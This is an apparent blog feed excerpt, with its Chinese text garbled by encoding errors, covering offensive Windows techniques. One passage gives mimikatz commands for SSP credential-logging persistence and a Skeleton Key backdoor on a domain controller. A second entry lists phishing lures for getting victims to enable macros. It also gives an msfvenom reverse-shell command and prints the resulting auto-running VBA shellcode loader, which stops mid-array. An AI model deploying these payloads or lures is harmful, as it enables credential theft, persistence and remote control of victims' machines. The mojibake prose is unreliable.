Support Providerï¼‰æ˜¯windowsæ“ä½œç³»ç»Ÿå®‰å…¨æœºåˆ¶çš„æä¾›è€…ã€‚ç®€å•çš„è¯´ï¼ŒSSPå°±æ˜¯DLLæ–‡ä»¶ï¼Œä¸»è¦ç”¨äºwindowsæ“ä½œç³»ç»Ÿçš„èº«ä»½è®¤è¯åŠŸèƒ½ï¼Œä¾‹å¦‚NTLMã€Kerberosã€Negotiateã€Secure Channelï¼ˆSchannelï¼‰ã€Digestã€Credentialï¼ˆCredSSPï¼‰ã€‚</p><p>ã€€ã€€SSPIï¼ˆSecurity Support Provider Interfaceï¼Œå®‰å…¨æ”¯æŒæä¾›ç¨‹åºæ¥å£ï¼‰æ˜¯windowsæ“ä½œç³»ç»Ÿåœ¨æ‰§è¡Œè®¤è¯æ“ä½œæ—¶ä½¿ç”¨çš„APIæ¥å£ã€‚å¯ä»¥è¯´SSPIå°±æ˜¯SSPçš„APIæ¥å£ã€‚</p><p>å¦‚æœè·å¾—ç›®æ ‡ç³»ç»Ÿsystemæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚å…¶ä¸»è¦åŸç†æ˜¯ï¼šLSAï¼ˆLocal Security Authorityï¼‰ç”¨äºèº«ä»½éªŒè¯ï¼›lsass.exeä½œä¸ºwindowsçš„ç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»å½•ç­–ç•¥ï¼›åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼ŒSSPå°†è¢«åŠ è½½åˆ°lsass.exe è¿›ç¨‹ä¸­ã€‚ä½†æ˜¯ï¼Œå‡å¦‚æ”»å‡»è€…å¯¹LSAè¿›è¡Œäº†æ‰©å±•ï¼Œè‡ªå®šä¹‰äº†æ¶æ„çš„DLLæ–‡ä»¶ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å°†å…¶åŠ è½½åˆ°lsass.exeè¿›ç¨‹ä¸­ï¼Œå°±èƒ½å¤Ÿè·å–lsass.exeè¿›ç¨‹ä¸­çš„æ˜æ–‡å¯†ç ã€‚è¿™æ ·å³ä½¿ç”¨æˆ·æ›´æ”¹å¯†ç å¹¶é‡æ–°ç™»å½•ï¼Œæ”»å‡»è€…ä¾ç„¶å¯ä»¥è·å¾—è¯¥è´¦å·çš„æ–°å¯†ç ã€‚</p><p><strong>åˆ©ç”¨mimikatzæ¥å®Œæˆ</strong></p><ul><li>å°†mimilib.dllå¤åˆ¶åˆ°åŸŸæ§<strong>c:\windows\system32</strong></li><li>æ·»åŠ æ³¨å†Œè¡¨:<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\SecurityPackages\</code>ä¸­</li><li>é‡å¯åè®°å½•ç™»å½•çš„å¯†ç </li></ul><p>å…·ä½“ä»£ç å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br><span class="line">reg add <span class="string">&quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;</span>Security Packages<span class="string">&quot; /d &quot;</span>kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib<span class="string">&quot; /t REG_MULTI_SZ</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/100.png" alt="image-20200806224652440"></p><p>ç„¶åé‡å¯åæŸ¥çœ‹æ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/101.png" alt="image-20200806225606582"></p><h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>åˆ©ç”¨mimikatzå®‰è£…ä¸€ä¸ªä¸‡èƒ½å¯†ç <code>mimikatz</code>ï¼Œå®ç°ä»£ç å¯ä»¥å‚è€ƒå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;blob&#x2F;master&#x2F;mimikatz&#x2F;modules&#x2F;kuhl_m_misc.c</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œä¸€ä¸‹å‘½ä»¤å°±å¯ä»¥ä½¿ç”¨<code>mimikatz</code>ä½œä¸ºä¸€ä¸ªä¸‡èƒ½å¯†ç ï¼Œå»è¿æ¥åŸŸæ§ï¼Œè¯¥æ–¹æ³•å¯ç”¨äºå½“åŸŸæ§å¯†ç è¢«æ”¹æ‰æ—¶ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥å»æ§åˆ¶åŸŸæ§ã€‚</p><blockquote><p>æ³¨æ„X64æœºå™¨è¦ä½¿ç”¨X64ç‰ˆæœ¬çš„mimikatz</p></blockquote><p>åœ¨åŸŸæ§ä¸Šè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/102.png" alt="image-20200806230603129"></p><p>åœ¨åŸŸå†…ä¸»æœºä¸Šè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-1OUEMJB0766.ascotbe.com <span class="string">&quot;mimikatz&quot;</span> /user:ascotbe.com\administrator</span><br><span class="line">dir \\WIN-1OUEMJB0766.ascotbe.com\c$</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/103.png" alt="image-20200806231009027"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2019-04-13&#x2F;1</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MjM5NzE1NjA0MQ&#x3D;&#x3D;&amp;mid&#x3D;2651202058&amp;idx&#x3D;1&amp;sn&#x3D;d3d57af49cea5f15d2c58b83bac35b7d&amp;chksm&#x3D;bd2cc7ac8a5b4ebafac72bb78d523f4956804a0d063f9e33f0f49ace2417a6c392738947330a&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0728NuHlnt4yB5qhc3gWClqQ&amp;sharer_sharetime&#x3D;1595949460134&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br><span class="line">https:&#x2F;&#x2F;man.linuxde.net&#x2F;ssh</span><br><span class="line">http:&#x2F;&#x2F;linux.51yip.com&#x2F;search&#x2F;ssh</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ccfxue&#x2F;article&#x2F;details&#x2F;53159896</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2527</span><br><span class="line">https:&#x2F;&#x2F;www.codenong.com&#x2F;cs105941102&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;MS_Tony_Shu&#x2F;article&#x2F;details&#x2F;93723432</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6943</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>å…³äºé‚®ä»¶é’“é±¼çš„å“ªäº›äº‹</title>
    <link href="https://www.ascotbe.com/2020/07/26/Office_0x01/"/>
    <id>https://www.ascotbe.com/2020/07/26/Office_0x01/</id>
    <published>2020-07-26T13:45:42.000Z</published>
    <updated>2021-05-17T00:31:53.721Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>æ¼æ´åˆ©ç”¨é‚£ä¸€èŠ‚æ”¾åˆ°ä¸‹ç¯‡å§ï¼Œå¤ç°ç¯å¢ƒæœ‰ç‚¹éš¾æ‰¾</p><h2 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h2><ul><li>kail-2019.4</li><li>windows7 sp1 x64</li><li>windows10 x64</li></ul><h2 id="Officeå®"><a href="#Officeå®" class="headerlink" title="Officeå®"></a>Officeå®</h2><h3 id="é¦–å…ˆæ¥åŒºåˆ«ä¸‹Wordå’ŒExcelå„ç§åç¼€ä¸­çš„åŒºåˆ«"><a href="#é¦–å…ˆæ¥åŒºåˆ«ä¸‹Wordå’ŒExcelå„ç§åç¼€ä¸­çš„åŒºåˆ«" class="headerlink" title="é¦–å…ˆæ¥åŒºåˆ«ä¸‹Wordå’ŒExcelå„ç§åç¼€ä¸­çš„åŒºåˆ«"></a>é¦–å…ˆæ¥åŒºåˆ«ä¸‹Wordå’ŒExcelå„ç§åç¼€ä¸­çš„åŒºåˆ«</h3><h4 id="Wordæ–‡æ¡£"><a href="#Wordæ–‡æ¡£" class="headerlink" title="Wordæ–‡æ¡£"></a>Wordæ–‡æ¡£</h4><p>97-2003çš„æ—§ç‰ˆæœ¬æ–‡ä»¶ååç¼€å°±æ˜¯**.doc**</p><p>ä»2007ç‰ˆä»¥ååç¼€åæ˜¯**.docx**</p><p><strong>docx</strong>å‰å®³ä¸€ç‚¹ã€‚å®ƒæ˜¯è¢«å‹ç¼©è¿‡çš„æ–‡æ¡£ï¼Œä½“ç§¯æ›´å°ï¼Œèƒ½å¤„ç†æ›´åŠ å¤æ‚çš„å†…å®¹ï¼Œè®¿é—®é€Ÿåº¦æ›´å¿«ã€‚</p><p>å¦‚æœæŠŠ<strong>docx</strong>çš„æ”¹ä¸º<strong>zip</strong>çš„è¯å¯ä»¥è§£å‹å‡ºé‡Œé¢çš„æ‰€æœ‰æ•°æ®ï¼Œä¸è¿‡ç©ºæ–‡æ¡£å¤§éƒ¨åˆ†éƒ½æ˜¯<strong>XM</strong>æ ¼å¼çš„æ–‡ä»¶</p><h4 id="Excelè¡¨æ ¼"><a href="#Excelè¡¨æ ¼" class="headerlink" title="Excelè¡¨æ ¼"></a>Excelè¡¨æ ¼</h4><p><strong>xls</strong>æ˜¯ä¸€ä¸ªç‰¹æœ‰çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå…¶æ ¸å¿ƒç»“æ„æ˜¯å¤åˆæ–‡æ¡£ç±»å‹çš„ç»“æ„ï¼Œè€Œ<strong>xlsx</strong>çš„æ ¸å¿ƒç»“æ„æ˜¯<strong>XML</strong>ç±»å‹çš„ç»“æ„ï¼Œé‡‡ç”¨çš„æ˜¯åŸºäº<strong>XML</strong>çš„å‹ç¼©æ–¹å¼ï¼Œä½¿å…¶å ç”¨çš„ç©ºé—´æ›´å°ã€‚<strong>xlsx</strong>ä¸­æœ€åä¸€ä¸ªxçš„æ„ä¹‰å°±åœ¨äºæ­¤ã€‚</p><p><strong>xls</strong>æ˜¯2003ç‰ˆæœ¬ä¸‹çš„æ–‡ä»¶ ï¼Œä¸ç®¡æœ‰æ²¡æœ‰å®ç¨‹åºçš„è¯éƒ½æ˜¯<strong>xls</strong>æ–‡ä»¶ ï¼Œä»2007å¼€å§‹åšäº†åŒºåˆ†ï¼Œ<strong>xlsm</strong>æ–‡ä»¶å’Œ<strong>xlsx</strong>æ–‡ä»¶éƒ½æ˜¯excel 2007åŠå…¶ä»¥åçš„æ–‡ä»¶ï¼Œä½†å‰è€…æ˜¯å«æœ‰å®å¯ç”¨ï¼ŒExcelä¸­é»˜è®¤æƒ…å†µä¸‹ä¸è‡ªåŠ¨å¯ç”¨å®ï¼Œé»˜è®¤æ˜¯<strong>xlsx</strong>ã€‚VBAä¸­ï¼Œå¦‚æœä¸æƒ³ä¿å­˜ä»£ç ï¼Œå¯ä»¥ä¿å­˜ä¸º<strong>xlsx</strong>ï¼Œå³å¯è‡ªåŠ¨åˆ é™¤å…¶ä¸­VBAä»£ç ï¼Œåä¹‹åˆ™ä¿å­˜ä¸º<strong>xlsm</strong>æ–‡ä»¶ã€‚</p><h3 id="å¦‚ä½•è¯±å¯¼"><a href="#å¦‚ä½•è¯±å¯¼" class="headerlink" title="å¦‚ä½•è¯±å¯¼"></a>å¦‚ä½•è¯±å¯¼</h3><p>å®æ˜¯Officeè‡ªå¸¦çš„ä¸€ç§é«˜çº§è„šæœ¬ç‰¹æ€§ï¼Œé€šè¿‡VBAä»£ç ï¼Œå¯ä»¥åœ¨Officeä¸­å»å®ŒæˆæŸé¡¹ç‰¹å®šçš„ä»»åŠ¡ï¼Œè€Œä¸å¿…å†é‡å¤ç›¸åŒçš„åŠ¨ä½œï¼Œç›®çš„æ˜¯è®©ç”¨æˆ·æ–‡æ¡£ä¸­çš„ä¸€äº›ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚ç”±äºæ—©äº›å¹´å®ç—…æ¯’æ³›æ»¥ï¼Œç°åœ¨Officeçš„å®åŠŸèƒ½å·²ç»é»˜è®¤æ˜¯ç¦ç”¨ï¼Œä½†ä¾ç„¶æ— æ³•é˜»æŒ¡æ”»å‡»è€…ä½¿ç”¨å®ã€‚é‚£ä¹ˆå¦‚ä½•å¼•è¯±å—å®³è€…å¼€å¯å®åŠŸèƒ½å°±æ˜¯å…³é”®äº†ï¼Œå¸¸ç”¨çš„å¥—è·¯</p><ul><li>æ–‡æ¡£æ˜¯è¢«ä¿æŠ¤çŠ¶æ€ï¼Œéœ€è¦å¯ç”¨å®æ‰èƒ½æŸ¥çœ‹ï¼›</li><li>æ·»åŠ ä¸€å¼ æ¨¡ç³Šçš„å›¾ç‰‡ï¼Œæç¤ºéœ€è¦å¯ç”¨å®æ‰èƒ½æŸ¥çœ‹é«˜æ¸…å›¾ç‰‡ï¼›</li><li>æç¤ºè¦æŸ¥çœ‹æ–‡æ¡£ï¼ŒæŒ‰ç»™å‡ºçš„ä¸€ç³»åˆ—æ­¥éª¤æ“ä½œï¼›</li><li>è´´ä¸€å¼ æŸæ€æ¯’è½¯ä»¶çš„Logoå›¾ç‰‡ï¼Œæš—ç¤ºæ–‡æ¡£è¢«å®‰å…¨è½¯ä»¶ä¿æŠ¤ã€‚</li></ul><h3 id="åˆ¶ä½œç®€å•çš„å®æ–‡ä»¶"><a href="#åˆ¶ä½œç®€å•çš„å®æ–‡ä»¶" class="headerlink" title="åˆ¶ä½œç®€å•çš„å®æ–‡ä»¶"></a>åˆ¶ä½œç®€å•çš„å®æ–‡ä»¶</h3><p>è¿™è¾¹ä»¥Wordæ–‡æ¡£æ¥ä¸¾ä¾‹å§ï¼Œä¼šçš„å¤§ä½¬ç›´æ¥è·³è¿‡ï¼Œæ„Ÿè§‰æ•´ç‰‡ä¼šè¢«è·³è¿‡äº†ï¼ˆé€ƒ</p><p>å…ˆåˆ›å»ºä¸ªæ–‡æ¡£<strong>doc</strong>å’Œ<strong>docx</strong>éƒ½è¡Œä¸ªäººæ„Ÿè§‰æ²¡å•¥åŒºåˆ«ï¼Œå¦‚æœæ˜¯<strong>doc</strong>çš„è¯å…¼å®¹æ€§ä¼šæ›´å¥½</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/1.png" alt="image-20200726202103886"></p><p>è®°å¾—è¦å¼€å®ï¼Œé»˜è®¤æ˜¯å…³çš„å°±å¾ˆéš¾å—</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/2.png" alt="image-20200726202204961"></p><p>ç„¶ååœ¨è§†å›¾ä½ç½®ç‚¹å‡»æ·»åŠ å®</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/3.png" alt="image-20200726202317197"></p><p>ç„¶åæ·»åŠ åæ˜¯è¿™ä¹ˆä¸€ä¸ªç©æ„</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/4.png" alt="image-20200726202406765"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº›è¯­æ³•äº†ï¼Œå’Œå¸¸è§„ç¼–ç¨‹å·®ä¸å¤šï¼Œå„ä½åº”è¯¥çœ‹ä¸€çœ¼å°±ä¼šäº†ï¼Œç„¶åè¯¥æ­»çš„macOS11è®©æˆ‘ç”¨ä¸äº†è™šæ‹Ÿæœºï¼Œè¿™è¾¹å…¨ç¨‹ä½¿ç”¨windowsæ¥æµ‹è¯•</p><p>é¦–å…ˆæˆ‘ä»¬æ¥ç”¨msfç”Ÿæˆä¸ªå®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.183.138 LPORT&#x3D;7890 -f vba -o ascotbe.vba</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘ä»¬ç”Ÿæˆçš„å®</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">If</span> Vba7 <span class="meta-keyword">Then</span></span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateThread <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Nyeo <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Pjfdx <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Acbomfr <span class="keyword">As</span> LongPtr, Gpzfu <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Groc <span class="keyword">As</span> <span class="type">Long</span>, Qrepb <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> VirtualAlloc <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Rpwgaj <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Ddbv <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Jduvicamq <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Glwnku <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RtlMoveMemory <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Raftpjwrc <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Wjiefyrxe <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Nvyyuvidk <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateThread <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Nyeo <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Pjfdx <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Acbomfr <span class="keyword">As</span> <span class="type">Long</span>, Gpzfu <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Groc <span class="keyword">As</span> <span class="type">Long</span>, Qrepb <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> VirtualAlloc <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Rpwgaj <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Ddbv <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Jduvicamq <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Glwnku <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RtlMoveMemory <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Raftpjwrc <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByRef</span> Wjiefyrxe <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Nvyyuvidk <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">#EndIf</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">        Dim Imtzv As Long, Laclv As Variant, Whxffnbhl As Long</span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> Vba7 <span class="meta-keyword">Then</span></span></span><br><span class="line">        <span class="keyword">Dim</span>  Esc <span class="keyword">As</span> LongPtr, Hyub <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">        <span class="keyword">Dim</span>  Esc <span class="keyword">As</span> <span class="type">Long</span>, Hyub <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">#EndIf</span><br><span class="line">        Laclv = Array(<span class="number">72</span>,<span class="number">131</span>,<span class="number">228</span>,<span class="number">240</span>,<span class="number">232</span>,<span class="number">204</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">81</span>,<span class="number">65</span>,<span class="number">80</span>,<span class="number">82</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">210</span>,<span class="number">101</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">96</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">24</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">114</span>,<span class="number">80</span>,<span class="number">72</span>,<span class="number">15</span>,<span class="number">183</span>,<span class="number">74</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">172</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">193</span>,<span class="number">201</span>,<span class="number">13</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">193</span>,<span class="number">226</span>,<span class="number">237</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">32</span>,<span class="number">139</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">102</span>,<span class="number">129</span>,<span class="number">120</span>,<span class="number">24</span>, _</span><br><span class="line"><span class="number">11</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">133</span>,<span class="number">114</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">139</span>,<span class="number">128</span>,<span class="number">136</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">133</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">103</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">80</span>,<span class="number">139</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">73</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">227</span>,<span class="number">86</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">201</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">52</span>,<span class="number">136</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">214</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">172</span>,<span class="number">65</span>,<span class="number">193</span>,<span class="number">201</span>,<span class="number">13</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">193</span>,<span class="number">56</span>,<span class="number">224</span>,<span class="number">117</span>,<span class="number">241</span>,<span class="number">76</span>,<span class="number">3</span>,<span class="number">76</span>,<span class="number">36</span>,<span class="number">8</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">209</span>,<span class="number">117</span>,<span class="number">216</span>,<span class="number">88</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">36</span>,<span class="number">73</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">208</span>,<span class="number">102</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">28</span>,<span class="number">73</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">4</span>,<span class="number">136</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">94</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">90</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">236</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">255</span>,<span class="number">224</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">18</span>,<span class="number">233</span>,<span class="number">75</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">93</span>,<span class="number">73</span>,<span class="number">190</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">50</span>,<span class="number">95</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">86</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">230</span>,<span class="number">72</span>,<span class="number">129</span>,<span class="number">236</span>,<span class="number">160</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">229</span>,<span class="number">73</span>, _</span><br><span class="line"><span class="number">188</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">30</span>,<span class="number">210</span>,<span class="number">192</span>,<span class="number">168</span>,<span class="number">183</span>,<span class="number">138</span>,<span class="number">65</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">228</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">241</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">255</span>,<span 